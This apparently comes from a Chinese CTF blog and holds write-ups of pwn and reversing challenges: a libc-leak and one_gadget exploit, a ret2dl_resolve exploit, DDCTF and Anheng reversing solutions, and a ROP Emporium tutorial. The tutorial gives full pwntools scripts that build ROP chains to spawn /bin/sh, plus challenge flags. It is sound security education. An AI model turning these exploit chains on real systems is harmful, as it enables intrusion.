= ELF('./pwn')libc = elf.libc# print libc# pause()p.recvuntil('name:')p.sendline('n0va')#泄漏__libc_start_main+240，每次泄漏一个字节p.recvuntil('input index\n')p.sendline('632')p.recvuntil('now value(hex) ')a = int(p.recv(2),16)print hex(a)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('633')p.recvuntil('now value(hex) ')b = (int(p.recvuntil('\n')[:-1],16))&amp;0xffprint hex(b)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('634')p.recvuntil('now value(hex) ')c = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(c)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('635')p.recvuntil('now value(hex) ')d = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(d)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('636')p.recvuntil('now value(hex) ')e = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(e)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('637')p.recvuntil('now value(hex) ')f = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(f)p.recvuntil('input new value\n')p.sendline('1')print hex(a),hex(b),hex(c),hex(d),hex(e),hex(f)libc_start_main = hex(f)[2:] + hex(e)[2:] + hex(d)[2:] + hex(c)[2:] + hex(b)[2:] + hex(a)[2:]libc_main = int(libc_start_main,16)-240 #拼接得到__libc_start_main地址print hex(int(libc_start_main,16))print hex(libc_main)offset = libc_main - libc.symbols['__libc_start_main'] #偏移one_gadget = offset + 0x45216 #onegadget地址print "one_gadget--&gt; " + hex(one_gadget)#修改返回地址，每次一个字节写入a = one_gadget&amp;0xffb = one_gadget&gt;&gt;8&amp;0xffc = one_gadget&gt;&gt;16&amp;0xffd = one_gadget&gt;&gt;24&amp;0xffe = one_gadget&gt;&gt;32&amp;0xfff = one_gadget&gt;&gt;40&amp;0xffprint hex(a),hex(b),hex(c),hex(d),hex(e),hex(f)p.recvuntil('input index\n')p.sendline('344')p.recvuntil('input new value\n')p.sendline(str(a))p.recvuntil('input index\n')p.sendline('345')p.recvuntil('input new value\n')p.sendline(str(b))p.recvuntil('input index\n')p.sendline('346')p.recvuntil('input new value\n')p.sendline(str(c))p.recvuntil('input index\n')p.sendline('347')p.recvuntil('input new value\n')p.sendline(str(d))p.recvuntil('input index\n')p.sendline('348')p.recvuntil('input new value\n')p.sendline(str(e))p.recvuntil('input index\n')p.sendline('349')p.recvuntil('input new value\n')p.sendline(str(f))#修改v1=40退出 循环p.recvuntil('input index\n')p.sendline('-4')p.sendline('40')p.recvuntil('do you want continue(yes/no)? \n')p.sendline('no')# flag&#123;1ed0e270f57c4e3969415180490fa07e&#125;p.interactive() baby_pwncheck，只开了NX 程度很简单，一个栈溢出漏洞，没有任何其它可用的函数，程序干净得可怕，其实就很容易想到runtime_resolve了，直接改脚本 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','bash','-c']context(arch='amd64', os='linux')# p = process('./pwn')p = remote("da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com","33865")elf = ELF('./pwn')read_plt = elf.plt['read']alarm_got = elf.got['alarm']# write_plt = elf.plt['write']bss_addr = elf.bss()bss_stage1 = 0x800 + bss_addrbss_stage2 = 80 + bss_stage1ppp_ret = 0x080485d9pop_ebp = 0x080485dbleave_ret = 0x08048448#read(0,bss_addr,100)payload = 'a'*44payload += p32(read_plt)payload += p32(ppp_ret)payload += p32(0)payload += p32(bss_stage1)payload += p32(100)payload += p32(pop_ebp)payload += p32(bss_stage1)payload += p32(leave_ret)# p.recvuntil('Welcome to XDCTF2015~!\n')# gdb.attach(p,"b *0x08048546")# pause()p.sendline(payload)cmd = '/bin/sh'plt_0 = 0x8048380rel_plt = 0x804833cindex_offset = (bss_stage1+28) - rel_plt# write_got = elf.got['write']dynsym = 0x080481dc #objdump -s -j .dynsym bofdynstr = 0x804827c #objdump -s -j .dynstr boffake_sym_addr = bss_stage1+36align = 0x10 -((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym&lt;&lt;8) | 0x7fack_reloc = p32(alarm_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrst_name = (fake_sym_addr + 0x10) - dynstr #加0x10是因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload = 'aaaa'payload += p32(plt_0)payload += p32(index_offset)payload += 'aaaa'payload += p32(bss_stage2)payload += 'aaaaaaaa'payload += fack_reloc #(bss_stage1+28)的位置payload += 'b'*alignpayload += fake_sym #(bss_stage1+36)的位置 payload += "system\x00"payload += 'a'*(80-len(payload))payload += cmd + '\x00'# payload += 'a'*(100-len(payload))p.sendline(payload)p.interactive()# flag&#123;4b91ebbdb3a0728572005c035aade579&#125; reeasyGo无符号GoLang，贴上网上一篇介绍GoLang逆向的文章，此题就是文章中的demon，flag 都没变，https://www.jishuwen.com/d/2NaJ 再附上一篇无符号Golang程序逆向方法解析https://www.anquanke.com/post/id/170332]]></content>
  </entry>
  <entry>
    <title><![CDATA[DDCTF的两道简单逆向]]></title>
    <url>%2F2019%2F04%2F18%2FDDCTF%E4%B9%8Bre%2F</url>
    <content type="text"><![CDATA[re132位PE文件，加了upx壳，先脱壳，随便一个工具就可以 脱完壳扔IDA， 逻辑其实很简单就是输入一串字符串，经过sub_401000这个函数处理之后，结果跟”DDCTF{reverseME}”进行比较 那么主要就是分析这个函数了， 虽然看起来干干净净，但是会发现有几个地方，v1定义了之后 直接用了，并没有任何的赋值，静态是看不出个所以然来的，所以我选择OD一波 这就是加密函数的汇编0x402FF8对应的就是数组 byte_402FF8，在IDA里可以看到，其实就是ASCII码表上的所以有值， 从0x20到0x7e就是可见字符，这个函数里面最核心的就是这句汇编mov dl byte ptr ds:[eax+0x402FF8]，它就是通过你输入的字符，倒着来找，其实就是把0x20~0x7e倒一下然后一一对应就没了（所以就很类似异或），把DDCTF{reverseME}，扔进去再倒一下就能得到正确的输入了 re2这也是一道 32位PE逆向，加了aspack壳，也找个脱壳工具一脱就行，不过有个问题就是，脱完壳不能运行了，不过逻辑是没有错的，所以要动态调的话就用没脱壳的就行 汇编直接逆先说一说头铁的做法，直接OD跟踪写出加密过程，再根据加密过程写去解密脚本，粗略地，的IDA上可以看到第一步检测和第一步加密 检测输入，长度为偶数，只能是[0,9]和[‘A’,’B’] （其实就是限制只能输入16进制数） 第一步加密，这里的加密逻辑还是可以从IDA里看出来的，（说白了就是将输入的字符转成16进制数，两个字符是一个16进制 嘛 ）但是接下来的加密看起来就会有点懵（但是它就只是个base64加密，后面再讲），所以就去OD跟一下看看情况喽 因为用的是未脱壳的程序，在pushad后，下ESP硬件断点，F9运行至popad后 单步到程序的真正入口，就可以搜索到程序的字符，下断，F9过去 单步进去加密函数，接下来就是单步看汇编，整出来的结果就是 12345a = x&gt;&gt;2;b = ((x&amp;3)&lt;&lt;4)+(y&gt;&gt;4);c = ((y&amp;0xf)*4)+(z&gt;&gt;6);d = z&amp;0x3f;(x,y,z为我们输入的三个16进制数（也就是6位字符）) 最后将a,b,c,d拼在一起就是结果 ，出来跟’DDCTF{reverse+}’比较，逆回去其实很简单，就是已知a,b,c,d求，x,y,z，reverse+共8位，所以两次爆破就可以了 1234567891011121314151617181920212223242526for(int x=0;x&lt;=256;x++)&#123; for(int y=0;y&lt;=256;y++)&#123; for(int z=0;z&lt;=256;z++)&#123; if(0x2b == x/4 &amp;&amp; 0x1e == (x&amp;3)*16+y/16 &amp;&amp; 0x2f == (y&amp;0xf)*4+z/64 &amp;&amp; 0x1e == (z&amp;0x3f)) &#123; printf("%02x %02x %02x\n",x,y,z); &#125; &#125; &#125;&#125;for(int x=0;x&lt;=256;x++)&#123; for(int y=0;y&lt;=256;y++)&#123; for(int z=0;z&lt;=256;z++)&#123; if(0x2b == x/4 &amp;&amp; 0x2c == (x&amp;3)*16+y/16 &amp;&amp; 0x1e == (y&amp;0xf)*4+z/64 &amp;&amp; 0x3e == (z&amp;0x3f)) &#123; printf("%02x %02x %02x\n",x,y,z); &#125; &#125; &#125;&#125; base64 其实这题的正解应该是base64，这也是常规的base64加密，只不过不是以输入字符去加密，而是直接输入16进制，也就是可以加密所有包括不可见字符，第一步转成16进制数就不用再说了，第二步的就是base64编码 所以我们只需要实现一个base64解码，以16进制形式输出就行了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; char base64code[65] = &#123;'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/','='&#125;; char s[2048]; gets(s); int l = strlen(s); int t = 0; char a[4]; while(t&lt;l)&#123; char x,y,z; int temp = 0; for(int i=0;i&lt;4;i++)&#123; a[i] = s[t++]; if(a[i]&gt;='A'&amp;&amp;a[i]&lt;='Z') a[i] = a[i]-'A'; else if(a[i]&gt;='a'&amp;&amp;a[i]&lt;='z') a[i] = a[i]-'G'; else if(a[i]&gt;='0'&amp;&amp;a[i]&lt;='9') a[i] = a[i] + 4; else if(a[i] == '=')&#123; a[i] = a[i] + 3; if(t == l)&#123; temp = 1; t = l; break; &#125; else&#123; temp = 2; t = l; break; &#125; &#125; else if(a[i] == '+') a[i] = a[i] + 19; else if(a[i] == '/') a[i] = a[i] + 16; &#125; if(!temp)&#123; x = (a[0]&lt;&lt;2) + (a[1]&gt;&gt;4); y = (a[1]&lt;&lt;4) + (a[2]&gt;&gt;2); z = (a[2]&lt;&lt;6) + (a[3]); &#125; else if(!(temp-1))&#123; x = (a[0]&lt;&lt;2) + (a[1]&gt;&gt;4); y = (a[1]&lt;&lt;4) + (a[2]&gt;&gt;2); z = ' '; &#125; else&#123; x = (a[0]&lt;&lt;2) + (a[1]&gt;&gt;4); y = ' '; z = ' '; &#125; // printf("%c%c%c",x,y,z); printf("%x %x %x ",x&amp;0xff,y&amp;0xff,z&amp;0xff); &#125; printf("\n"); return 0;&#125; 转成大写字母就是flag了]]></content>
  </entry>
  <entry>
    <title><![CDATA[2019安恒杯1月月赛]]></title>
    <url>%2F2019%2F04%2F04%2F2019%E5%AE%89%E6%81%92%E6%9D%AF1%E6%9C%88%E6%9C%88%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[python_crackme（拿安恒杯1月月赛的题目she来讲）首先，你会拿到一个由python编译的exe文件，使用pyinstxtractor.py脚本（下载地址）反编译exe文件 得到一个文件夹里面有一大堆东西 用010editor打开与exe文件同名的二进制文件 添加上python3.6的.pyc文件的文件头（即前12字节）然后再加上后缀名.pyc 再在线反编译一下（反编译地址）即可得到python源码：1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python# encoding: utf-8# 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pycimport osn1 = input('Tell me your name?')n2 = input('Tell me your pasw')n11 = chr(ord(n1[0]) + 12)s = ''st3 = '51e'st2 = '9f1ff1e8b5b91110'st1 = 'c4e21c11a2412'st0 = 'wrong'if n11 + 'AnHeng' == n2: for i in range(0, 4): s += st1[3 - i] print('Congratulations') ts = st2[0] + st3 + st2[1] + s print('flag&#123;' + st3[:1] + st1 + st2 + st3[-2:] + '&#125;') os.system('pause')else: print('no,' + st0)import osn1 = input('Tell me your name?')n2 = input('Tell me your pasw')n11 = chr(ord(n1[0]) + 12)s = ''st3 = '51e'st2 = '9f1ff1e8b5b91110'st1 = 'c4e21c11a2412'st0 = 'wrong'if n11 + 'AnHeng' == n2: for i in range(0, 4): s += st1[3 - i] print('Congratulations') ts = st2[0] + st3 + st2[1] + s print('flag&#123;' + st3[:1] + st1 + st2 + st3[-2:] + '&#125;') os.system('pause')else: print('no,' + st0) old-diver32位pe文件，无壳 IDA分析：将v9的类型修改为char[]型，同时可以看到这里到401000处理的代码进行了加密异或，先解密一波：123456s = get_bytes(0x401000,0x260)buf = ''for i in s: buf += chr(ord(i)^0xbb)from idaapi import *patch_bytes(0x401000,buf) 重新构造解密部分函数，先undefine the current function（快捷键u）再 creat a function（快捷键p），重新F5，可以看到两个函数已经恢复正常 可以开始分析程序了第一步验证前5位：”flag{“然后进入sub_4010b0函数第二步异或 第三步：base64加密，”c19zbWNf”解码第四步：走迷宫 123456789-------- 上下左右g + + 2 a q w+ + ++ ++ + #+ ++ ++++ ++ ++++ ++ +--------waaaaawwwww22222qqqaaw 最终得到flag:flag{this_is_smc_waaaaawwwww22222qqqaaw}]]></content>
  </entry>
  <entry>
    <title><![CDATA[pwn入门之ROP]]></title>
    <url>%2F2019%2F04%2F04%2Fpwn%E5%85%A5%E9%97%A8%E4%B9%8BROP%2F</url>
    <content type="text"><![CDATA[ret2winROP Emporium 放到IDA很容易就找到溢出点123char s; // [esp+0h] [ebp-28h] 可以看出s距ebp的偏移量为0x28所以我们写入0x28正好可以写到ebp之前，要覆盖ebp还需要再写入4个字节（32位） 有一点值得引起注意，我们回车换行符同样会输入进去，明确溢出点以及可溢出的字节后接下来我们就开始构造rop，但在之前我们还应该检查一下程序开户了哪些保护，这决定了我们该采取何种rop攻击方式 exp 如下 ：123456from pwn import *sh = process('./ret2win32')ret2win32 = 0x08048659payload = 'A' * 0x28 + p32(0) + p32(ret2win32)sh.sendline(payload)sh.interactive() 64位的溢出点也一样exp:123456from pwn import *sh = process('./ret2win')ret2win = 0x400811payload = "A" * 0x20 + p64(0) + p64(ret2win)sh.sendline(payload)sh.interactive() split溢出点还是一样，不过少了可直接利用的函数，但是程序中提供了system函数和字符串”/bin/cat flag.txt”，同样ret到system并且通过栈传入”/bin/cat flag.txt”即可exp: 1234567from pwn import *sh = process('./split32')system = 0x08048657cat = 0x0804A030pyaload = 'A' * 0x28 + p32(0) + p32(system) + p32(cat)sh.sendline(pyaload)sh.interactive() 因为64位rdi是存储函数的第一个参数，所以我们需要pop rdi ;ret通过命令1ROPgadget --binary ./split --only &quot;pop|ret&quot; 找到gadget12345678910111213Gadgets information============================================================0x000000000040087c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040087e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400880 : pop r14 ; pop r15 ; ret0x0000000000400882 : pop r15 ; ret0x000000000040087b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040087f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop rbp ; ret0x0000000000400883 : pop rdi ; ret0x0000000000400881 : pop rsi ; pop r15 ; ret0x000000000040087d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004005b9 : ret 64位exp:12345678from pwn import *sh = process('./split')system = 0x4005E0cat_flag = 0x601060pop = 0x400883payload = "A" * 0x20 + p64(0) + p64(pop) + p64(cat_flag) + p64(system)sh.sendline(payload)sh.interactive() callme溢出点还是一样，不过现在程序 没有system函数，flag也不是直接cat flag.txt得到，而是通过callme_one,callme_two,callme_three三个函数的调用计算得到，我们看一下.so文件 这里要求传入的三个参数为1，2，3，接下来写exp这里需要注意，因为要连续调用3个函数，所以需要注意callme_one调用完了之后的返回地址不能再向前两道一样随便写p32(0)了，这里是为了保持栈的平衡，callme_one执行完之后 要把它的三个参数1,2,3弹出去，esp才能指向p32(callme_two)12345678910111213from pwn import *sh = process('./callme32')pop3_ret = 0x80488a9callme_one = 0x080485C0callme_two = 0x08048620callme_three = 0x080485B0payload = ""payload += "a" * 0x28 + p32(0)payload += p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_three) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)sh.sendline(payload)sh.interactive() 12345678payload += p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)其中的pop3_ret 是为了把 p32(1) + p32(2) + p32(3)弹出栈，最后一个ret指令相当于pop eip也就是把栈顶的内容传给eip，从而改变执行流程，在执行完三次pop后，esp已经指向p32(callme_two)，这样就可以接着去指向第二段rop从而顺利调用callme_two(1,2,3)poppoppopret地址可以用objdump找到 如果对此不太好理解的话，可以进入gdb一步步跟着调试，可以看清楚具体的流程 只有将1，2，3pop出去esp才能指向callme_two。 64位程序 ，就不需要栈平衡了，在64位下，前6个参数通过rdi,rsi,rdx,rcx,r8,r9传递，所以需要找到pop rdi;pop rsi ;pop rdx ret 的gadget可以用 objdump -d callme | grep -A 3 pop找到 也可以用ROPgadget –binary ./callme –only “pop|ret”12345678910111213141516Gadgets information============================================================0x0000000000401b1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b1e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b20 : pop r14 ; pop r15 ; ret0x0000000000401b22 : pop r15 ; ret0x0000000000401b1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b1f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000401900 : pop rbp ; ret0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret0x0000000000401b23 : pop rdi ; ret0x0000000000401ab2 : pop rdx ; ret0x0000000000401b21 : pop rsi ; pop r15 ; ret0x0000000000401ab1 : pop rsi ; pop rdx ; ret0x0000000000401b1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004017d9 : ret exp:123456789101112131415161718from pwn import *sh = process('./callme')callme_one = 0x401850callme_two = 0x401870callme_three = 0x401810# pop_rdi = 0x401b23# pop_rsi_rdx = 0x401ab1pop_rdi_rsi_rdx_ret = 0x401ab0payload = ""payload += 'a' * 0x20 + p64(0)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_one)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_two)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_three)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three)sh.sendline(payload)sh.interactive() write4write432： 同样的溢出点，但是这次没有/bin/sh，需要我们自己写到data中或者bss 中，两种写法没什么不同，就改个地址而已，这里就只说写到data段中，“/bin/sh”在32位中需要分两次写到 data 中去，用ROPgadget 查找可用的gadget 先： 123这里用到 0x08048670 : mov dword ptr [edi], ebp ; ret0x080486da : pop edi ; pop ebp ; ret exp :1234567891011121314151617181920212223242526# -*- coding:UTF-8 -*-from pwn import *sh = process('./write432')data_addr = 0x0804A028 #写入到 data 段# bss_addr = 0x0804A040 #写入到 bss 段system_ply = 0x08048430pop_edi_ebp = 0x080486damov_edi_ebp = 0x08048670payload = ""payload += 0x28 * "A" + p32(0)payload += p32(pop_edi_ebp)# payload += p32(bss_addr)payload += p32(data_addr)payload += "/bin"payload += p32(mov_edi_ebp)payload += p32(pop_edi_ebp)# payload += p32(bss_addr + 4)payload += p32(data_addr + 4)payload += "/sh\x00"payload += p32(mov_edi_ebp)payload += p32(system_ply)payload += p32(0)# payload += p32(bss_addr)payload += p32(data_addr)sh.sendline(payload)sh.interactive() write4:一样的思路，只不过在写入data的时候64位可以一次写入12345678910111213141516171819202122# -*- coding:UTF-8 -*-from pwn import *sh = process('./write4')# bss_addr = 0x0000000000601060 #写入到 bss 段data_addr = 0x0000000000601050 #写入到 data 段mov_r14_r15 = 0x0000000000400820pop_r14_r15 = 0x0000000000400890system_plt = 0x00000000004005E0pop_rdi = 0x0000000000400893payload = ""payload += 0x20 * "A" + p64(0)payload += p64(pop_r14_r15)payload += p64(data_addr)# payload += p64(bss_addr)payload += "/bin/sh\x00"payload += p64(mov_r14_r15)payload += p64(pop_rdi)# payload += p64(bss_addr)payload += p64(data_addr)payload += p64(system_plt)sh.sendline(payload)sh.interactive() badchars这次的程序对输入的字符进行了过滤,对于特定字符b,i,c/ &lt;空格&gt;,f,n.s，会被替换成-21，当然这会对我们成功写入”/bin/sh\x00”造成影响，所以我们要绕过这步替换12345678910111213141516171819202122232425 v3[0] = 'b'; v3[1] = 'i'; v3[2] = 'c'; v3[3] = '/'; v3[4] = ' '; v3[5] = 'f'; v3[6] = 'n'; v3[7] = 's'; j = 0LL; for ( i = 0LL; ; ++i ) &#123; result = i; if ( i &gt;= a2 ) break; for ( j = 0LL; j &lt;= 7; ++j ) &#123; if ( *(a1 + i) == v3[j] ) &#123; *(a1 + i) = -21; break; &#125; &#125; &#125; return result;&#125; 可以用xor将 “/bin/sh\x00”先进行加密，成功写入后再解密进行传参，先来找一下可以异或的数字：12345678910111213141516binsh = "/bin/sh\x00"badchar = [98, 105, 99, 47, 32, 102, 110, 115]# for i in badchar:# print chr(i)xornum = 1while 1: for x in binsh: tem = ord(x) ^ xornum if tem in badchar: xornum += 1 break if x == "\x00": print xornum xornum += 1 if xornum == 10: break 找到2，3，5，9，接下来查找一下gadget123456789101112131415161718192021$ ROPgadget --binary ./badchars32 --only &quot;mov|pop|ret|xor&quot;Gadgets information============================================================0x08048607 : mov al, byte ptr [0xc9010804] ; ret0x08048893 : mov dword ptr [edi], esi ; ret0x08048570 : mov ebx, dword ptr [esp] ; ret0x080488fb : pop ebp ; ret0x08048896 : pop ebx ; pop ecx ; ret0x080488f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048461 : pop ebx ; ret0x08048897 : pop ecx ; ret0x080488fa : pop edi ; pop ebp ; ret0x0804889a : pop edi ; ret0x080488f9 : pop esi ; pop edi ; pop ebp ; ret0x08048899 : pop esi ; pop edi ; ret0x0804844a : ret0x0804885e : ret 0xd750x080485be : ret 0xeac10x08048890 : xor byte ptr [ebx], cl ; retUnique gadgets found: 16 因为32位程序一次只能传4个字符，所以需要分两次传exp:123456789101112131415161718192021222324252627282930313233343536# -*- coding:UTF-8 -*-from pwn import *sh = process('./badchars32')sysetm_plt = 0x080484E0binsh = "/bin/sh\x00"xorbinsh = ""#加密for i in binsh: xorbinsh += chr(ord(i) ^ 2)mov_edi_esi = 0x08048893pop_esi_edi = 0x08048899pop_ebx_ecx = 0x08048896xor_ebx_cl = 0x08048890bss_addr = 0x0804A044payload = ""payload += 0x28 * "A" + p32(0)#分两次传payload += p32(pop_esi_edi)payload += xorbinsh[0:4]payload += p32(bss_addr)payload += p32(mov_edi_esi)payload += p32(pop_esi_edi)payload += xorbinsh[4:8]payload += p32(bss_addr + 4)payload += p32(mov_edi_esi)#解密for x in range(0,len(xorbinsh)): payload += p32(pop_ebx_ecx) payload += p32(bss_addr + x) + p32(2) payload += p32(xor_ebx_cl)payload += p32(sysetm_plt) + p32(0) + p32(bss_addr)sh.sendline(payload)sh.interactive() 64位程序 ：一样的思路，先查一下gadget :1234567891011121314151617181920212223242526272829$ ROPgadget --binary ./badchars --only &quot;mov|pop|ret|xor&quot;Gadgets information============================================================0x0000000000400853 : mov byte ptr [rip + 0x20084e], 1 ; ret0x0000000000400b35 : mov dword ptr [rbp], esp ; ret0x00000000004008ee : mov eax, 0 ; pop rbp ; ret0x0000000000400a3b : mov eax, dword ptr [rbp - 8] ; pop rbp ; ret0x0000000000400b34 : mov qword ptr [r13], r12 ; ret0x0000000000400a3a : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret0x0000000000400bac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400b3b : pop r12 ; pop r13 ; ret0x0000000000400bae : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400b3d : pop r13 ; ret0x0000000000400b40 : pop r14 ; pop r15 ; ret0x0000000000400b42 : pop r15 ; ret0x0000000000400852 : pop rbp ; mov byte ptr [rip + 0x20084e], 1 ; ret0x0000000000400bab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400baf : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop rbp ; ret0x0000000000400b39 : pop rdi ; ret0x0000000000400b41 : pop rsi ; pop r15 ; ret0x0000000000400bad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400b3c : pop rsp ; pop r13 ; ret0x00000000004006b1 : ret0x0000000000400aad : ret 0x10750x0000000000400b30 : xor byte ptr [r15], r14b ; ret0x0000000000400b31 : xor byte ptr [rdi], dh ; retUnique gadgets found: 24 64位程序就可以一次传进去exp:12345678910111213141516171819202122232425262728293031# -*- coding:UTF-8 -*-from pwn import *sh = process('./badchars')binsh = "/bin/sh\x00"xorbinsh = ""#加密for i in binsh: xorbinsh += chr(ord(i) ^ 2)bss_addr = 0x0000000000601080system_plt = 0x00000000004006F0mov_r13_r12_ret = 0x0000000000400b34pop_r12_r13_ret = 0x0000000000400b3bxor_r15_r14_ret = 0x0000000000400b30pop_r14_r15_ret = 0x0000000000400b40pop_rdi_ret = 0x0000000000400b39payload = ""payload += 0x28 * "A"#一次传入payload += p64(pop_r12_r13_ret)payload += xorbinshpayload += p64(bss_addr)payload += p64(mov_r13_r12_ret)#解密 for i in range(0,len(xorbinsh)): payload += p64(pop_r14_r15_ret) payload += p64(2) + p64(bss_addr + i) payload += p64(xor_r15_r14_ret)payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(system_plt)sh.sendline(payload)sh.interactive() fluff题目的设置跟前面的题还是一样没什么变化，查一波gadget，会发现在这次的写入没之前的那么顺利12345678910111213141516171819202122232425262728293031$ ROPgadget --binary ./fluff32 --only &quot;mov|pop|ret|xor|xchg&quot;Gadgets information============================================================0x08048547 : mov al, byte ptr [0xc9010804] ; ret0x08048709 : mov dword ptr [0x81fffffd], eax ; ret0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x08048674 : mov ebp, 0xcafebabe ; ret0x080484b0 : mov ebx, dword ptr [esp] ; ret0x0804867e : mov edi, 0xdeadbabe ; ret0x0804868c : mov edx, 0xdefaced0 ; ret0x0804867d : pop ebp ; mov edi, 0xdeadbabe ; ret0x0804868b : pop ebp ; mov edx, 0xdefaced0 ; ret0x08048695 : pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x080486fb : pop ebp ; ret0x080486f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080483e1 : pop ebx ; ret0x08048696 : pop ebx ; xor byte ptr [ecx], bl ; ret0x08048692 : pop edi ; mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x080486fa : pop edi ; pop ebp ; ret0x08048670 : pop edi ; xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret0x08048673 : pop esi ; mov ebp, 0xcafebabe ; ret0x080486f9 : pop esi ; pop edi ; pop ebp ; ret0x0804867a : pop esi ; xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret0x080483ca : ret0x080484fe : ret 0xeac10x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret0x08048697 : xor byte ptr [ecx], bl ; ret0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; retUnique gadgets found: 26 因为没有mov可以直接写入，这里我们可以用xor进行写入操作，用一个xor操作清空寄存器A，再通过 xor A,B就可以将B寄存器的内容写入到寄存器A中去。这道题就是巧秒得利用了xor来进行写入。exp:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# -*- coding:UTF-8 -*-from pwn import *context.log_level = "debug"sh = process('./fluff32')binsh = "/bin/sh\x00"system_plt = 0x08048430data_addr = 0x0804A028#mov_ecx_edx;pop_ebp;pop_ebx;xor_ecx_bl;retgadget1 = 0x08048693#xor_edx_edx;pop_esi;mov_ebp_0xcafebabe;ret 亦或自身gadget2 = 0x08048671#xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; retgadget3 = 0x0804867bpop_ebx = 0x080483e1#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; retgadget4 = 0x08048689junk = "A" * 4payload = ""payload += 0x28 * "A" + junkpayload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(pop_ebx) + p32(data_addr)payload += p32(gadget3) + p32(0) #(edx = data_addr,pop_ebp,mov)payload += p32(gadget4) + p32(0) #ecx = data_addrpayload += p32(pop_ebx) payload += "/bin"payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = "/bin",pop_ebp,mov)#"/bin"放到data中去payload += p32(gadget1) + p32(0) + p32(0)payload += p32(pop_ebx) + p32(data_addr + 4)payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = data_addr,pop_ebp,mov)payload += p32(gadget4) + p32(0) #ecx = data_addr + 4payload += p32(pop_ebx) payload += "/sh\x00"payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = "/bin",pop_ebp,mov)#"xsh\x00"放到data中去payload += p32(gadget1) + p32(0) + p32(0)payload += p32(system_plt) + p32(0) + p32(data_addr)sh.sendline(payload)sh.interactive() 64位程序 